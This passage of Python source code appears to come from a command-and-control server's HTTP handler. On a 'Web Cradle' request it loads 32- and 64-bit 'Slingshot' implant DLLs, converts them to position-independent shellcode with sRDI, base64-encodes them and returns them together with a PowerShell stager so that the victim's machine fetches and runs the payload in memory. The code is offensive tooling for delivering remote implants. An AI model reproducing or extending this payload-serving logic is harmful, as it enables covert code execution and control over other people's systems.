        if HTTPConfig.CradlePage in self.path:
            (identifier ,) = re.findall(r'/{0}\?{1}=(.+)'.format(HTTPConfig.CradlePage, HTTPConfig.CradleVar), self.path)

            logging.print('')
            logging.success("Received Web Cradle request for '{}'".format(identifier), 1)
            logging.print('')
            
            stager = dll_32 = dll_64 = None
            
            try:
                dll_32 = open(Paths.DLLs + 'slingshot_x86.dll', 'rb').read()
                dll_64 = open(Paths.DLLs + 'slingshot_x64.dll', 'rb').read()             
            except:
                logging.error("Unable to load Slingshot DLLs. Are both architectures in 'data/dlls' ?")
                
            try:
                try:
                    stager = open(Paths.PowershellScripts + 'stager.ps1', 'r').read()
                except UnicodeDecodeError:
                    stager = open(Paths.PowershellScripts + 'stager.ps1', 'r', encoding='utf_16').read()
            except:
                logging.error("Unable to load stager.ps1. Is it in 'scripts/powershell'?")


            if stager and dll_32 and dll_64:
                sc_32 = base64.b64encode(srdi.ConvertToShellcode(dll_32, 'Load')).decode()
                sc_64 = base64.b64encode(srdi.ConvertToShellcode(dll_64, 'Load')).decode()

                response = 'if([IntPtr]::size -eq 4){{$S = "{}"}}else{{$S = "{}"}}\n{}'.format(sc_32, sc_64, stager).encode()